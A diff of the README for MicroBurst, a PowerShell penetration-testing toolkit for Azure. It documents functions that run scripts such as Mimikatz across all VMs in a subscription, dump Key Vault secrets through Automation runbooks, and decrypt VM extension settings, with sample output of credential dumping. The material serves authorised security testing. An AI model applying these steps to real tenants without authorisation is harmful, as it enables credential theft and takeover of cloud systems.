@@ -1,14 +1,17 @@
-![MicroBurstLogo](https://github.com/NetSPI/MicroBurst/blob/master/Images/Microburst.png) 
+![MicroBurstLogo](http://blog.netspi.com/wp-content/uploads/2020/03/Microburst_Github.png) 
 <br> 
 [![licence badge]][licence] 
 [![stars badge]][stars] 
 [![forks badge]][forks] 
-[![issues badge]][issues] |
+[![issues badge]][issues]
+![Twitter Follow](https://img.shields.io/twitter/follow/kfosaaen.svg?style=social)
+
 
 [licence badge]:https://img.shields.io/badge/license-New%20BSD-blue.svg
 [stars badge]:https://img.shields.io/github/stars/NetSPI/MicroBurst.svg
 [forks badge]:https://img.shields.io/github/forks/NetSPI/MicroBurst.svg
 [issues badge]:https://img.shields.io/github/issues/NetSPI/MicroBurst.svg
+
 
 [licence]:https://github.com/NetSPI/MicroBurst/blob/master/LICENSE.txt
 [stars]:https://github.com/NetSPI/MicroBurst/stargazers
@@ -21,14 +24,38 @@
 MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping. It is intended to be used during penetration tests where Azure is in use.
 
 ### Author, Contributors, and License
-* Author: Karl Fosaaen (@kfosaaen), NetSPI - 2018
-* Contributors: Scott Sutherland (@_nullbind), Thomas Elling (@thomaselling)
+* Author: Karl Fosaaen (@kfosaaen), NetSPI
+* Contributors: Scott Sutherland (@_nullbind), Thomas Elling (@thomaselling), Jake Karnes (jakekarnes42)
 * License: BSD 3-Clause
-* Required Dependencies: Azure, AzureRM, and MSOnline PowerShell Modules
+* Required Dependencies: Az, Azure, AzureRM, AzureAD, and MSOnline PowerShell Modules are all used in different scripts
+* Dependencies Note: Originally written with the AzureRM PS modules, older scripts have been ported to their newer Az equivalents
 
 ### Importing the Module
 	Import-Module .\MicroBurst.psm1
+This will import all applicable functions based off of the currently installed modules in your environment.
 
+Recommended Modules to install:
+* <a href="https://docs.microsoft.com/en-us/powershell/azure/new-azureps-module-az?view=azps-3.6.1">Az</a>
+* <a href="https://docs.microsoft.com/en-us/powershell/module/azuread/?view=azureadps-2.0">AzureAd</a>
+* <a href="https://docs.microsoft.com/en-us/powershell/module/msonline/?view=azureadps-1.0">MSOnline</a>
+
+### Related Blogs
+* <a href="https://blog.netspi.com/enumerating-azure-services/">Anonymously Enumerating Azure Services</a>
+* <a href="https://blog.netspi.com/anonymously-enumerating-azure-file-resources/">Anonymously Enumerating Azure File Resources</a>
+* <a href="https://blog.netspi.com/get-azurepasswords/">Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions</a>
+* <a href="https://blog.netspi.com/exporting-azure-runas-certificates/">Get-AzurePasswords: Exporting Azure RunAs Certificates for Persistence</a>
+* <a href="https://blog.netspi.com/azure-automation-accounts-key-stores">Using Azure Automation Accounts to Access Key Vaults</a>
+* <a href="https://blog.netspi.com/utiilzing-azure-for-red-team-engagements/">Utilizing Azure Services for Red Team Engagements</a>
+* <a href="https://blog.netspi.com/running-powershell-scripts-on-azure-vms">Running PowerShell on Azure VMs at Scale</a>
+* <a href="https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/">Maintaining Azure Persistence via Automation Accounts</a>
+
+### Presentations
+* <a href="https://www.youtube.com/watch?v=EYtw-XPml0w">Adventures in Azure Privilege Escalation - DerbyCon 9</a>
+  - <a href="https://notpayloads.blob.core.windows.net/slides/Azure-PrivEsc-DerbyCon9.pdf">DerbyCon 9 (2019) Slides</a>
+* <a href="https://www.youtube.com/watch?v=IdORwgxDpkw">Attacking Azure Environments with PowerShell - DerbyCon 8</a>
+  - <a href="https://www.slideshare.net/kfosaaen/derbycon-8-attacking-azure-environments-with-powershell">DerbyCon 8 (2018) Slides</a>
+  - <a href="https://www.slideshare.net/kfosaaen/bsides-portland-attacking-azure-environments-with-powershell">BSidesPDX (2018) Slides</a>
+	
 ### Functions Information
 # Get-AzurePasswords.ps1
 PS C:\> Get-Help Get-AzurePasswords
@@ -258,3 +285,139 @@ DESCRIPTION: The function will dump available information for an Office365 domai
     VERBOSE: 134 service principals were enumerated.
     VERBOSE: All done.
 	
+# Invoke-AzureRmVMBulkCMD.ps1
+PS C:\> Import-Module .\Get-MSOLDomainInfo.ps1
+
+PS C:\> Get-Help Invoke-AzureRmVMBulkCMD
+
+NAME: Invoke-AzureRmVMBulkCMD
+
+SYNOPSIS: Runs a Powershell script against all (or select) VMs in a subscription/resource group/etc.
+
+SYNTAX: Invoke-AzureRmVMBulkCMD [[-Subscription] <String[]>] [[-ResourceGroupName] <String[]>] [[-Name] <String[]>] [-Script] <String> [[-output] <String>] [<CommonParameters>]
+
+DESCRIPTION: This function will run a PowerShell script on all (or a list of) VMs in a subscription/resource group/etc. This can be handy for creating reverse shells, running Mimikatz, or doing practical automation of work.
+    
+    -------------------------- EXAMPLE 1 --------------------------
+    
+    PS C:\MicroBurst>Invoke-AzureRmVMBulkCMD -Verbose -Script .\Mimikatz.ps1
+    
+    Executing C:\MicroBurst\Mimikatz.ps1 against all (1) VMs in the Testing-Resources Subscription
+    Are you Sure You Want To Proceed: (Y/n): 
+    VERBOSE: Running .\Mimikatz.ps1 on the Remote-West - (10.2.0.5 : 40.112.160.13) virtual machine (1 of 1)
+    VERBOSE: Script Status: Succeeded
+    Script Output: 
+      .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Feb 16 2015 22:15:28)
+     .## ^ ##.  
+     ## / \ ##  /* * *
+     ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+     '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+      '#####'                                     with 15 modules * * */
+    
+    
+    mimikatz(powershell) # sekurlsa::logonpasswords
+    [Truncated]
+    mimikatz(powershell) # exit
+    Bye!
+    
+    VERBOSE: Script Execution Completed on Remote-West - (10.2.0.5 : 40.112.160.13)
+    VERBOSE: Script Execution Completed in 37 seconds
+
+RELATED LINKS: https://blog.netspi.com/running-powershell-scripts-on-azure-vms
+
+# Get-AzureKeyVaults-Automation.ps1
+PS C:\> Import-Module .\Get-AzureKeyVaults-Automation.ps1
+
+PS C:\> Get-Help Get-AzureKeyVaults-Automation
+
+NAME: Get-AzureKeyVaults-Automation
+
+SYNOPSIS: Dumps all available Key Vault Keys/Secrets from an Azure subscription via Automation Accounts. Pipe to Out-Gridview, ft -AutoSize, or Export-CSV for easier parsing.
+
+SYNTAX: Get-AzureKeyVaults-Automation [[-Subscription] <String>] [[-CertificatePassword] <String>] [[-ExportCerts] <String>] [<CommonParameters>]
+
+DESCRIPTION: This function will look for any Key Vault Keys/Secrets that are available to an Automation RunAs Account, or as a configured Automation credential. 
+    If either account has Key Vault permissions, the runbook will read the values directly out of the Key Vaults.
+    A runbook will be spun up, so it will create a log entry in the automation jobs.
+    Per the statements above, and the fact that you may try to access keys that you may not have permissions for... This should not be considered as Opsec Safe.
+
+    -------------------------- EXAMPLE 1 --------------------------
+    PS C:\MicroBurst>Get-AzureKeyVaults-Automation -Verbose
+    
+    VERBOSE: Logged In as kfosaaen@notasubscription.onmicrosoft.com
+    VERBOSE: Getting List of Azure Automation Accounts...
+    VERBOSE: 	Automation Credential (testcred) found for kfosaaen Automation Account
+    VERBOSE: 	Automation Credential (testCred2) found for kfosaaen Automation Account
+    VERBOSE: 	Getting getting available Key Vault Keys/Secrets using the kfosaaen Automation Account, testcred Credential, and the FCIGmKqaTkEUViN.ps1 Runbook
+    VERBOSE: 		Waiting for the automation job to complete
+    VERBOSE: 		Removing FCIGmKqaTkEUViN runbook from kfosaaen Automation Account
+    VERBOSE: 	Getting getting available Key Vault Keys/Secrets using the kfosaaen Automation Account, testCred2 Credential, and the HzROkCvceonUNdh.ps1 Runbook
+    VERBOSE: 		Waiting for the automation job to complete
+    VERBOSE: 		Removing HzROkCvceonUNdh runbook from kfosaaen Automation Account
+    VERBOSE: Automation Key Vault Dumping Activities Have Completed
+
+RELATED LINKS: https://blog.netspi.com/azure-automation-accounts-key-stores
+
+# Get-AzureVMExtensionSettings.ps1
+PS C:\> Import-Module .\Get-AzureVMExtensionSettings.ps1
+
+PS C:\> Get-Help Get-AzureVMExtensionSettings -full
+
+NAME
+    Get-AzureVMExtensionSettings
+
+SYNOPSIS
+    PowerShell function for dumping information from Azure VM Extension Settings
+
+
+SYNTAX
+    Get-AzureVMExtensionSettings [<CommonParameters>]
+
+
+DESCRIPTION
+    The function will read all available extension settings, decrypt protected values (if the required certificate can be
+    found) and return all the settings.
+
+
+PARAMETERS
+    <CommonParameters>
+        This cmdlet supports the common parameters: Verbose, Debug,
+        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
+        OutBuffer, PipelineVariable, and OutVariable. For more information, see
+        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).
+
+INPUTS
+
+OUTPUTS
+
+    -------------------------- EXAMPLE 1 --------------------------
+
+	PS C:\> Get-AzureVMExtensionSettings
+
+	FileName                        : C:\Packages\Plugins\Microsoft.Azure.Security.IaaSAntimalware\1.5.5.9\RuntimeSettings\0.settings
+	ExtensionName                   : Microsoft.Azure.Security.IaaSAntimalware
+	ProtectedSettingsCertThumbprint : 
+	ProtectedSettings               : 
+	ProtectedSettingsDecrypted      : 
+	PublicSettings                  : {"AntimalwareEnabled":true,"RealtimeProtectionEnabled":"false","ScheduledScanSettings":{...},"Exclusions":{...}}
+
+	FileName                        : C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.5\RuntimeSettings\0.settings
+	ExtensionName                   : Microsoft.Compute.CustomScriptExtension
+	ProtectedSettingsCertThumbprint : 23B8893CD7...
+	ProtectedSettings               : MIIB8AYJKoZIhvcNAQc...UNMih8=
+	ProtectedSettingsDecrypted      : {"fileUris":["http://.../netspi/launcher.ps1"]}
+	PublicSettings                  : {"commandToExecute":"powershell -ExecutionPolicy Unrestricted -file launcher.ps1 "}
+
+	FileName                        : C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.3\RuntimeSettings\1.settings
+	ExtensionName                   : Microsoft.CPlat.Core.RunCommandWindows
+	ProtectedSettingsCertThumbprint : C85DD4C5E9...
+	ProtectedSettings               : MIIBsAYJKoZI...B+E0ZomM6gAghguFCQ28f2w==
+	ProtectedSettingsDecrypted      : 
+	PublicSettings                  : {"script":["whoami"]}
+	
+	FileName                        : C:\WindowsAzure\CollectGuestLogsTemp\5e3cfc7e-c8b2-4fce-96f0-6c1b2c2bc87d.zip\Config\WireServerRoleExtensionsConfig_f26eeb35-229d-4f5e-9877-f8666a1680e9._MGITest.xml
+	ExtensionName                   : Microsoft.Compute.VMAccessAgent
+	ProtectedSettingsCertThumbprint : 20304BDF13...
+	ProtectedSettings               : MIIB0AYJKoZI...GkBIzEtqohr/WJd5KSCK
+	ProtectedSettingsDecrypted      : {"Password":"[REDACTED]"}
+	PublicSettings                  : {"UserName":"[REDACTED]"}
